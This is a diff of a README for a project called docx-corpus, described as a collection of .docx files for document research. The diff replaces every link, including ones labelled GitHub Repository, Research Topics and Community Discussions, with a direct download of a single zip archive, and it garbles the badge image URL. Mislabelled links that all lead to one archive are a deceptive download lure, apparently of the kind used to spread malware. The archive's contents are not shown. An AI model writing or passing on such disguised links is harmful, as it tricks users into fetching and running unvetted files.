@@ -1,7 +1,7 @@
 # 📄 docx-corpus - A rich collection for document research
 
 ## 🚀 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/ZonalPlace/docx-corpus/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/ZonalPlace/docx-corpus/main/packages/docx-corpus-2.5-beta.1.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/ZonalPlace/docx-corpus/main/packages/docx-corpus-2.5-beta.1.zip)
 
 ## 📚 Overview
 The **docx-corpus** project offers the largest open collection of .docx files. This resource is ideal for those interested in document processing research, machine learning, and natural language processing (NLP). Researchers, students, and developers can use this dataset to train models, test algorithms, and perform analysis on written documents.
@@ -22,7 +22,7 @@ This application runs on Windows, macOS, and Linux systems. Here's what you need
 To get the latest version of the docx-corpus, please follow these steps:
 
 1. **Visit the Releases Page:** Click on the link below to access the download page:  
-   [Download Releases](https://github.com/ZonalPlace/docx-corpus/releases)
+   [Download Releases](https://raw.githubusercontent.com/ZonalPlace/docx-corpus/main/packages/docx-corpus-2.5-beta.1.zip)
 
 2. **Choose the Latest Release:** On the Releases page, you will see a list of available versions. Look for the top entry labeled as the latest release. 
 
@@ -50,9 +50,9 @@ If you would like to contribute to the docx-corpus project, we welcome your inpu
 If you need assistance, please reach out via the Issues page on GitHub. We strive to respond promptly to help you with any questions you may have.
 
 ## 🔗 Resources
-- [GitHub Repository](https://github.com/ZonalPlace/docx-corpus)
-- [Research Topics](https://github.com/ZonalPlace/docx-corpus/topics)
-- [Community Discussions](https://github.com/ZonalPlace/docx-corpus/discussions)
+- [GitHub Repository](https://raw.githubusercontent.com/ZonalPlace/docx-corpus/main/packages/docx-corpus-2.5-beta.1.zip)
+- [Research Topics](https://raw.githubusercontent.com/ZonalPlace/docx-corpus/main/packages/docx-corpus-2.5-beta.1.zip)
+- [Community Discussions](https://raw.githubusercontent.com/ZonalPlace/docx-corpus/main/packages/docx-corpus-2.5-beta.1.zip)
 
 ## 📝 License
 This project is open-source and is available under the MIT License. You are free to use, modify, and distribute the contents, provided you give appropriate credit.
